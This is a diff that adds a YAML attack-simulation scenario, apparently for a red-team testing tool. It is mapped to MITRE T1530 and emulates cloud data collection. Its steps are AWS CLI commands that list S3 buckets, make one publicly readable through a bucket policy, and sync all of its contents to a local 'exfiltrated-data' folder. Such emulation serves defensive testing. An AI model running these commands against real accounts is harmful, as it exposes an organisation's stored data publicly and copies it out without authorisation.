@@ -1,0 +1,13 @@
+name: S3 Public Bucket Exposure and Data Retrieval
+description: Simulates making an S3 bucket public and downloading its contents
+mitre_technique: T1530
+stage: Collection
+steps:
+  - action: aws s3api list-buckets --query 'Buckets[*].Name'
+    description: List all available S3 buckets
+  - action: aws s3api put-bucket-policy --bucket ${S3_BUCKET_NAME} --policy file://public-policy.json
+    description: Apply public-read policy to the selected bucket
+  - action: aws s3 ls s3://${S3_BUCKET_NAME}/ --recursive
+    description: List all files in the now-public bucket
+  - action: aws s3 sync s3://${S3_BUCKET_NAME}/ ./exfiltrated-data
+    description: Download all contents from the bucket
